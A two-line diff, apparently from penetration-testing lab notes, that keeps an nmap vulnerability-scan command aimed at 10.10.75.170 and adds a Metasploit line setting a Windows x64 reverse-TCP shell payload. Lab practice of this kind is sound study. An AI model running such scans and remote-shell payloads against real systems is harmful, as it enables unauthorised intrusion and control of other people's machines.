@@ -1,1 +1,2 @@
 nmap -sV --script vuln 10.10.75.170
+set payload windows/x64/shell/reverse_tcp
